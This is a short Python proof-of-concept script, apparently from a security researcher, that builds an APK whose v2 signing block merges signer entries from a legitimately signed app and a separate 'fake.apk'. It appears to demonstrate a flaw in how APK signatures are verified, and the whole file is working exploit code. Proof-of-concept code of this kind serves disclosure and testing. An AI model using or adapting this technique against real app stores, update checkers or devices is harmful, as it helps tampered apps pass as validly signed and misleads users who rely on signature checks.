#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: GPL-3.0-or-later

import apksigcopier
import apksigtool
import dataclasses


apksigcopier.copy_apk("app.apk", "poc-unsigned.apk")

apksigtool.do_sign("poc-unsigned.apk", "poc.apk", cert="cert-rsa.der",
                   key="privkey-rsa.der", no_v1=True)

_, sig_block_a = old_v2_sig_a = apksigtool.extract_v2_sig("poc.apk")
_, sig_block_b = old_v2_sig_b = apksigtool.extract_v2_sig("fake.apk")
blk_a = apksigtool.parse_apk_signing_block(sig_block_a, allow_nonzero_verity=True)
blk_b = apksigtool.parse_apk_signing_block(sig_block_b, allow_nonzero_verity=True)
blk_poc = dataclasses.replace(blk_a, pairs=blk_a.pairs + blk_b.pairs)
apksigtool.replace_apk_signing_block("poc.apk", blk_poc.dump(), old_v2_sig=old_v2_sig_a)
